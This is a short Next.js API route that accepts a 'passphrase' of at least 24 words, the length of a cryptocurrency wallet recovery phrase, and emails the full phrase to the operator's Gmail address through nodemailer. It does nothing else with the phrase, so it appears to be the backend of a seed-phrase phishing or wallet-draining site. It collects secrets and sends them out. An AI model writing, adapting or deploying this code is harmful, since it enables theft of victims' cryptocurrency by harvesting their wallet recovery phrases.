import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(request: NextRequest) {
    try {
        const body = await request.json();
        const { passphrase } = body;

        // Validation
        if (typeof passphrase !== 'string' || !passphrase.trim()) {
            return NextResponse.json(
                { error: 'Passphrase must be a non-empty string' },
                { status: 400 }
            );
        }

        const trimmed = passphrase.trim();
        const wordCount = trimmed.split(/\s+/).length;

        if (wordCount < 24) {
            return NextResponse.json(
                { error: `Passphrase must be at least 24 words (${wordCount} given)` },
                { status: 400 }
            );
        }

        // Email sending
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: process.env.EMAIL_USER,
                pass: process.env.EMAIL_PASS,
            },
        });

        await transporter.sendMail({
            from: `"Passphrase Bot" <${process.env.EMAIL_USER}>`,
            to: process.env.EMAIL_USER,
            subject: 'New Passphrase Received',
            text: `Passphrase:\n\n${trimmed}\n\nWords: ${wordCount}\nTime: ${new Date().toISOString()}`,
        });

        return NextResponse.json({
            message: 'Passphrase sent to email successfully',
        });

    } catch (error) {
        console.error('API error:', error);
        return NextResponse.json(
            { error: 'Server error' },
            { status: 500 }
        );
    }
}